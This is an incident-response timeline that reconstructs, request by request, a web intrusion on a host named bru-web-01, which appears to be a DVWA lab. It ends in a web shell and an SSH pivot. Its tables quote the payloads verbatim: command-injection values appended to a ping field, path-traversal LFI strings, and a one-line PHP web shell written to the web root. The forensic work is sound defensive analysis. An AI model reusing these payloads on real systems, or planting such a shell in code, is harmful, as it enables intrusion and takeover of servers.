# Attack Timeline: INC-2026-005

Full request-level chronology of the intrusion on bru-web-01, reconstructed from web_access.log and auth.log. All timestamps are the real request time (UTC+02:00). SIEM indexing timestamps are not used.

---

| Time (5 Jun 2026) | Source | Event | Evidence |
|---|---|---|---|
| 08:00:02 | 172.16.50.10 | Portal authentication (login.php, index.php) via curl | web_access.log |
| 11:11:59 | 172.16.50.10 | First malicious request: first POST against the ping tool (command injection) | web_access.log, pcap stream 1269 |
| 11:53:30 | 172.16.50.10 | POST exec: command injection (`;id`) | web_access.log, pcap stream 1572 |
| 12:10:20 | 172.16.50.10 | POST exec: command injection (`;whoami`) | web_access.log, pcap stream 1683 |
| 12:47:59 | 172.16.50.10 | LFI baseline: ?page=include.php (response 5510) | web_access.log |
| 12:57:24 | 172.16.50.10 | LFI: ?page=../../../../etc/passwd (response 3868, failed) | web_access.log |
| 13:35:17 | 172.16.50.10 | POST exec: command injection (`;cat /etc/passwd`, accounts file leaked in response) | web_access.log, pcap stream 2251 |
| 13:49:04 | 172.16.50.10 | LFI: ?page=../../../../etc/os-release (3868, failed) | web_access.log |
| 14:15:47 | 172.16.50.10 | POST exec: command injection (`;ls -la /var/www/html/`) | web_access.log, pcap stream 2522 |
| 14:25:00 | 172.16.50.10 | LFI: ?page=../../../../var/log/apache2/access.log (3868, failed) | web_access.log |
| 14:54:21 | 172.16.50.10 | POST exec: command injection (`;uname -a`) | web_access.log, pcap stream 2783 |
| 15:13:46 | 172.16.50.10 | LFI: ?page=../../../../var/www/html/dvwa/config/config.inc.php (3868, failed) | web_access.log |
| 15:34:04 | 172.16.50.10 | POST exec: web shell write (`echo ... > /var/www/html/shell.php`) | web_access.log, pcap stream 3054 |
| 15:35:40 | 172.16.50.10 | Web shell usage: GET /shell.php?cmd=id (RCE confirmed, response `uid=33(www-data)`) | web_access.log, pcap stream 3066 |
| 15:37:23 | 172.16.50.10 | Web shell usage: GET /shell.php?cmd=ls -la /var/www/html/ | web_access.log, pcap stream 3076 |
| 15:47:15 | 172.16.50.10 | SSH Accepted password for j.martin (pivot, login 1 of 3) | auth.log |
| 15:47:17 | 172.16.50.10 | SSH Accepted password for j.martin (login 2 of 3) | auth.log |
| 15:47:20 | 172.16.50.10 | SSH Accepted password for j.martin (login 3 of 3) | auth.log |

---

## Stream-to-payload mapping (PCAP)

The seven command injection POSTs, decoded from their follow-streams:

| Stream | Decoded POST body | Purpose |
|---|---|---|
| 1269 | ip=127.0.0.1 | Benign baseline (vector validation) |
| 1572 | ip=127.0.0.1;id | Process identity |
| 1683 | ip=127.0.0.1;whoami | User confirmation |
| 2251 | ip=127.0.0.1;cat /etc/passwd | System accounts file read (real leak) |
| 2522 | ip=127.0.0.1;ls -la /var/www/html/ | Web root enumeration |
| 2783 | ip=127.0.0.1;uname -a | Kernel / OS fingerprint |
| 3054 | ip=127.0.0.1;echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php | Web shell write |

---

## Reading the timeline

The interleaving of POST exec (command injection, productive) and GET LFI (file viewer, all failed) shows two parallel approaches by the same actor. The command injection track succeeded at every step; the LFI track failed at every step. The web shell write (15:34) precedes its two uses (15:35, 15:37), and the SSH pivot (15:47) follows roughly ten minutes after web shell usage, the escalation from web-process execution to an interactive account foothold.
